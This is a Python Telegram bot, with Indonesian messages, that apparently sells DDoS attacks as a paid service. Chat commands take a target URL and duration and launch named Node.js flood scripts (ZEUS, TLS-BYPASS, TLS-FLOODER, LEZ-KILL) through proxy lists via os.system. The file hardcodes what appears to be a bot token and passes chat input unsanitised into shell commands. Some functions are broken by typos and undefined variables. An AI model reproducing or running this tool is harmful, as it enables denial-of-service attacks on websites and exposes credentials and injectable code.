import telebot
import os
import time


bot = telebot.TeleBot("6695090938:AAHAfksreT4hu4TNR0oHhK8kN-5IcGQnwSY")


def run_ZEUS(url, time):
    os.system(f"node ZEUS.js {url} {time} 512 10 proxy.txt")

def run_entot(url, time):
    os.system(f"node HTTP-ENTOD.js {url} 512 {time} ")
    
def run_LEZKILL(url, time):
    os.system(f"node LEZKILL.js {url} {time} 512 10 proxy.txt")
    
def run_raw(url, time):
    os.system(f"node HTTP-RAW.js {url} {time}")

def run_tls(url, time):
    os.system(f"node tlsv2.js {url} {time} 10 512 proxy.txt")
    
def run_tls2(url, time):
    os.system(f"node madara.js {url} {time} 32 10 proxy.txt")
    
def run_tlsbypass(url):
    os.systen(f"node TLS-BYPASS.js {url} 120 60 98 proxy.txt")

def run_tlsflooder(url, time):
    os.systen(f"node TLS-FLOODER.js {url} {time} 10 10 proxy.txt")
    
def run_hold(url, time):
    os.systen(f"node hold.js {url} {time} 10 10 proxy.txt")

allowed_usernames = ["GMFR444X"]


@bot.message_handler(commands=['usage'])
def start(message):
  bot.reply_to(message, text='Cara Menggunakan /[METHOD] [URL] [TIME] Untuk Thread Dll Sudah Owner Setting Agar Tidak Melebihi Batas Anj')

@bot.message_handler(commands=['start'])
def start(message):

    if message.from_user.username in allowed_usernames:
        bot.reply_to(message, '''Halo! Akses Diterima
        
        tutorial memakai /usage
        show all method /method''')
    else:
        bot.reply_to(message, "Akses ditolak. Username Anda tidak terdaftar harap membeli plan Hwheheh")


@bot.message_handler(commands=['menu'])
def menu(message):
    bot.reply_to(message, text='Usage : /[METHOD] [URL] [TIME] Thread Dll Owner Yang Nentuin Anj')

@bot.message_handler(commands=['ZEUS'])
def run(message):

    command, url, time = message.text.split(' ', 2)
    

    if url and time:
        bot.reply_to(message, f"Menjalankan ddos untuk {url} selama {time} detik...")
        run_ZEUS(url, time)
        bot.reply_to(message, "Attack Succesfully")
    else:
        bot.reply_to(message, "URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.")

@bot.message_handler(commands=['HTTP'])
def run(message):

    command, url, time = message.text.split(' ', 2)
    

    if url and time:
        bot.reply_to(message, f"Menjalankan ddos untuk {url} selama {time} detik...")
        run_entot(url, time)
        bot.reply_to(message, "Attack Succesfully")
    else:
        bot.reply_to(message, "URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.")
        

@bot.message_handler(commands=['HTTP-RAW'])
def run(message):

    command, url, time = message.text.split(' ', 2)
    

    if url and time:
        bot.reply_to(message, f"Menjalankan ddos untuk {url} selama {time} detik...")
        run_raw(url, time)
        bot.reply_to(message, "Attack Succesfully")
    else:
        bot.reply_to(message, "URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.")
        

@bot.message_handler(commands=['tls2'])
def run(message):

    command, url, time = message.text.split(' ', 2)
    

    if url and time:
        bot.reply_to(message, f"Menjalankan ddos untuk {url} selama {time} detik...")
        run_tls2(url, time)
        bot.reply_to(message, "Attack Succesfully")
    else:
        bot.reply_to(message, "URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.")
        

@bot.message_handler(commands=['TLS'])
def run(message):

    command, url, time = message.text.split(' ', 2)
    

    if url and time:
        bot.reply_to(message, f"Menjalankan ddos untuk {url} selama {time} detik...")
        run_tls(url, time)
        bot.reply_to(message, "Attack Succesfully")
    else:
        bot.reply_to(message, "URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.")

@bot.message_handler(commands=['LEZ-KILL'])
def run(message):

    command, url, time = message.text.split(' ', 2)
    

    if url and time:
        bot.reply_to(message, f"Menjalankan ddos untuk {url} selama {time} detik...")
        run_LEZKILL(url, time)
        bot.reply_to(message, "Attack Succesfully")
    else:
        bot.reply_to(message, "URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.")
        
@bot.message_handler(commands=['TLS-BYPASS'])
def run(message):

    command, url, = message.text.split(' ', 1)
    

    if url:
        bot.reply_to(message, f"Menjalankan ddos untuk {url} selama {time} detik...")
        run_tlsbypass(url,)
        bot.reply_to(message, "Attack Succesfully")
    else:
        bot.reply_to(message, "URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.")        
@bot.message_handler(commands=['TLS-FLOODER'])
def run(message):

    command, url, time = message.text.split(' ', 2)
    

    if url and time:
        bot.reply_to(message, f"Menjalankan ddos untuk {url} selama {time} detik...")
        run_tlsflooder(url, time)
        bot.reply_to(message, "Attack Succesfully")
    else:
        bot.reply_to(message, "URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.")

@bot.message_handler(commands=['HOLD'])
def run(message):

    command, url, time = message.text.split(' ', 2)
    

    if url and time:
        bot.reply_to(message, f"Menjalankan ddos untuk {url} selama {time} detik...")
        run_tlsflooder(url, time)
        bot.reply_to(message, "Attack Succesfully")
    else:
        bot.reply_to(message, "URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.")        
@bot.message_handler(commands=['method'])        
def method(message):
    response = '''L7 :
HTTP
HTTP-RAW
tls2
FLOODER
TLS
TLS-BYPASS
TLS-FLOODER
HOLD

L4 :
LEZ-KILL'''
    bot.reply_to(message, response)
   
    

@bot.message_handler(func=lambda message: True)
def echo(message):
    bot.reply_to(message, "Maaf, perintah tidak valid. Ketik /start untuk memulai.")


bot.polling()